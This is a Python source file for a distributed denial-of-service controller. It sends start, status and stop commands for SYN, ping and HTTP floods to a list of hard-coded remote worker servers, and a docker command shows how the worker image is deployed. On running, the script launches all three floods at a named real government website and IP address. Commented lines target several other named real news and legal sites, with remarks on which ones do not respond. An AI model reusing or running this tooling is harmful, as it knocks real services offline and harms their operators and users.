import requests
from pydantic import parse_obj_as

from message_protocol.job_attack_http_flood_start_input import JobAttackHttpFloodStartInput
from message_protocol.job_attack_http_flood_status_output import JobAttackHttpFloodStatusOutput
from message_protocol.job_attack_ping_flood_start_input import JobAttackPingFloodStartInput
from message_protocol.job_attack_ping_flood_status_output import JobAttackPingFloodStatusOutput
from message_protocol.job_attack_syn_flood_start_input import JobAttackSynFloodStartInput
from message_protocol.job_attack_syn_flood_status_output import JobAttackSynFloodStatusOutput


class ClientJob():
    def ping(self, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/ping"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)

    # Attack syn flood
    #-----------------------------------------------------------------------------------------------------------------------
    def attack_syn_flood_start(self, input: JobAttackSynFloodStartInput, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/job/attack/syn_flood/start"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=input.json(), headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)

    def attack_syn_flood_status(self, base_url: str, timeout_in_seconds: int = 30) -> JobAttackSynFloodStatusOutput:
        url = base_url + "/job/attack/syn_flood/status"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return JobAttackSynFloodStatusOutput.parse_obj(response_json)

    def attack_syn_flood_stop(self, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/job/attack/syn_flood/stop"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)
    #-------------------------------------------------------------------------------------------------------------------

    

    # Attack ping flood
    #-------------------------------------------------------------------------------------------------------------------
    def attack_ping_flood_start(self, input: JobAttackPingFloodStartInput, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/job/attack/ping_flood/start"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=input.json(), headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)

    def attack_ping_flood_status(self, base_url: str, timeout_in_seconds: int = 30) -> JobAttackPingFloodStatusOutput:
        url = base_url + "/job/attack/ping_flood/status"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return JobAttackPingFloodStatusOutput.parse_obj(response_json)

    def attack_ping_flood_stop(self, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/job/attack/ping_flood/stop"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)
    #-------------------------------------------------------------------------------------------------------------------



    # Attack http flood
    #-------------------------------------------------------------------------------------------------------------------
    def attack_http_flood_start(self, input: JobAttackHttpFloodStartInput, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/job/attack/http_flood/start"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=input.json(), headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)

    def attack_http_flood_status(self, base_url: str, timeout_in_seconds: int = 30) -> JobAttackHttpFloodStatusOutput:
        url = base_url + "/job/attack/http_flood/status"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return JobAttackHttpFloodStatusOutput.parse_obj(response_json)

    def attack_http_flood_stop(self, base_url: str, timeout_in_seconds: int = 30) -> bool:
        url = base_url + "/job/attack/http_flood/stop"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, headers=headers, timeout=timeout_in_seconds)
        response.raise_for_status()
        response_json = response.json()
        return parse_obj_as(bool, response_json)
    #-------------------------------------------------------------------------------------------------------------------


c = ClientJob()
t = "178.62.102.230"
#worker_china = "http://114.55.225.21:9543"
worker_10_2 = "http://178.62.81.170:9543"
worker_10_1 = "http://178.62.81.170:8543"
worker_9_2 = "http://165.22.207.194:9543"
worker_9_1 = "http://165.22.207.194:8543"
worker_8 = "http://165.227.229.72:9543"
worker_7 = "http://159.223.27.124:9543"
worker_6 = "http://178.62.89.136:9543"
worker_5 = "http://206.189.119.118:9543"
worker_4 = "http://128.199.84.196:9543"
worker_3 = "http://165.227.152.133:9543"
worker_2 = "http://164.90.206.129:9543"
worker_1 = "http://64.227.66.149:9543"
# docker run --name=tekleo-security --rm -tid -p 9543:9543 jpleorx/tekleo:tekleo-security
remote_workers = [
    worker_1, worker_2, worker_3, worker_4,
    worker_5, worker_6, worker_7, worker_8,
    worker_9_1, worker_9_2,
    worker_10_1, worker_10_2
]

def ping():
    print('PING')
    for url in remote_workers:
        print(url, c.ping(url))

def attack_syn_flood_start(ip: str, port: int):
    print('ATTACK SYN FLOOD START')
    i = JobAttackSynFloodStartInput(ip, port)
    for url in remote_workers:
        print(url, c.attack_syn_flood_start(i, url))

def attack_syn_flood_status():
    print('ATTACK SYN FLOOD STATUS')
    for url in remote_workers:
        print(url, c.attack_syn_flood_status(url))

def attack_syn_flood_stop():
    print('ATTACK SYN FLOOD STOP')
    for url in remote_workers:
        print(url, c.attack_syn_flood_stop(url))

def attack_ping_flood_start(ip: str):
    print('ATTACK PING FLOOD START')
    i = JobAttackPingFloodStartInput(ip)
    for url in remote_workers:
        print(url, c.attack_ping_flood_start(i, url))

def attack_ping_flood_status():
    print('ATTACK PING FLOOD STATUS')
    for url in remote_workers:
        print(url, c.attack_ping_flood_status(url))

def attack_ping_flood_stop():
    print('ATTACK PING FLOOD STOP')
    for url in remote_workers:
        print(url, c.attack_ping_flood_stop(url))

def attack_http_flood_start(url: str):
    print('ATTACK HTTP FLOOD START')
    i = JobAttackHttpFloodStartInput(url)
    for url in remote_workers:
        print(url, c.attack_http_flood_start(i, url))

def attack_http_flood_status():
    print('ATTACK HTTP FLOOD STATUS')
    for url in remote_workers:
        print(url, c.attack_http_flood_status(url))

def attack_http_flood_stop():
    print('ATTACK HTTP FLOOD STOP')
    for url in remote_workers:
        print(url, c.attack_http_flood_stop(url))        

# ping()
# attack_http_flood_status()
# attack_ping_flood_status()
# attack_syn_flood_status()

# DATA.GOV.RU
attack_http_flood_start("https://data.gov.ru/")
attack_syn_flood_start("46.61.230.118", 443)
attack_ping_flood_start("46.61.230.118")

# GARANT.RU
# attack_http_flood_start("https://garant.ru/")
# attack_syn_flood_start("195.209.35.145", 443)
# attack_ping_flood_start("195.209.35.145")

# RIA.RU (does not respond to our traffic)
# attack_http_flood_start("https://ria.ru/")
# attack_syn_flood_start("178.248.233.32", 443)
# attack_ping_flood_start("178.248.233.32")

# tvzvezda.ru (does not respond to our traffic)
#attack_http_flood_start("https://tvzvezda.ru/")
#attack_syn_flood_start("178.248.234.76", 443)
#attack_ping_flood_start("178.248.234.76")

# attack_http_flood_stop()
# attack_ping_flood_stop()
# attack_syn_flood_stop()
